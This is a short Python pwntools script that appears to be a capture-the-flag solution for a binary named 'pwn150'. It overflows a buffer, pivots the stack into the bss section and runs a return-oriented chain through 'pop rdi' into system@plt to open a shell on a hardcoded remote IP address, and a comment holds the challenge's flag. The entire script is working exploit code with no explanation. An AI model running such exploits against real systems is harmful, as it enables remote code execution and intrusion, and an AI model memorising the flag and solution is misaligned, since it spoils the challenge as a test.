#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# Bugs_Bunny{did_i_help_you_Solve_it!oHH_talk_to_hacker:D}

host , port = '54.153.19.139' , 5253
#host , port = '192.168.78.133' , 4000
y = remote( host , port )

e = ELF('pwn150')


pop_rdi = 0x400883

p = 'D' * 0x50
p += p64( e.bss() + 0x20 + 0x50 + 0x300 )
p += p64( 0x40078d )

y.sendafter( ':' , p + '\n' )
sleep(0.7)

p = 'D' * 0x40
p += 'sh\x00\x00' * ( 4 + 2 )
p += p64( pop_rdi )
p += p64( 0x6013e0 )
p += p64( e.plt['system'] )

y.sendline(  p + '\n' )

y.interactive()